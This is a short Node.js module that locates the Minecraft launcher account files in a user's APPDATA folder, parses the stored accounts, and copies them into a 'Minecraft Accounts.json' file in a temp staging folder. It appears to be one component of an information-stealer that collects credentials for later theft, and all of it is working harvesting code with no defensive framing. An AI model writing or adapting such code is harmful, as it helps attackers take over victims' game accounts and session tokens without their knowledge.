const { join, sep } = require('path');
const fs = require('fs');
const { tempFolder } = require('../index');

fs.writeFileSync(join(tempFolder, 'Minecraft Accounts.json'), '[]');
const paths = [
  join(process.env.APPDATA, '.minecraft', 'launcher_accounts.json'),
  join(process.env.APPDATA, '.minecraft', 'launcher_accounts_microsoft_store.json'),
];

paths.forEach(file => {
  if (fs.existsSync(file)) {
    const { accounts } = JSON.parse(fs.readFileSync(file).toString());
    const accountsFile = JSON.parse(fs.readFileSync(join(tempFolder, 'Minecraft Accounts.json')).toString());
    Object.keys(accounts).forEach(account => {
      accounts[account].source = file.split(sep).slice(5, -1)[0].replace('.', '') || 'Unknown';
      const source = accounts[account].source;
      accounts[account].source = source.replace(source[0], source[0].toUpperCase());
      accountsFile.push(accounts[account]);
    });
    fs.writeFileSync(join(tempFolder, 'Minecraft Accounts.json'), JSON.stringify(accountsFile));
  }
});
